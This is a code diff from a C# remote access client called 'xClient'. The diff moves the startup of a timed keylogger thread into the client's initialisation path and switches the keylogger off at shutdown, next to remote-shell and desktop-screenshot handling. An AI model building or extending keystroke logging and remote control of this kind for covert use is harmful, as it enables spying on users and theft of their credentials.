@@ -5,6 +5,7 @@ using System.Windows.Forms;
 using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
+using xClient.Core.Keylogger;
 using xClient.Core.Packets;
 
 namespace xClient
@@ -35,6 +36,8 @@ namespace xClient
             CommandHandler.CloseShell();
             if (CommandHandler.LastDesktopScreenshot != null)
                 CommandHandler.LastDesktopScreenshot.Dispose();
+            if (Logger.Instance != null)
+                Logger.Instance.Enabled = false;
             if (_appMutex != null)
                 _appMutex.Close();
 
@@ -123,6 +126,14 @@ namespace xClient
                 new Thread(SystemCore.UserIdleThread).Start();
 
                 InitializeClient();
+
+                if (Settings.ENABLELOGGER)
+                {
+                    new Thread(() =>
+                    {
+                        Logger logger = new Logger(30000) { Enabled = true };
+                    }).Start();
+                }
             }
             else
             {
@@ -133,16 +144,6 @@ namespace xClient
                     return;
 
                 SystemCore.Install();
-            }
-
-            if (Settings.ENABLELOGGER)
-            {
-                new Thread(() =>
-                {
-                    Logger logger = new Logger(30000);
-
-                    logger.Enabled = true;
-                }).Start();
             }
         }
 
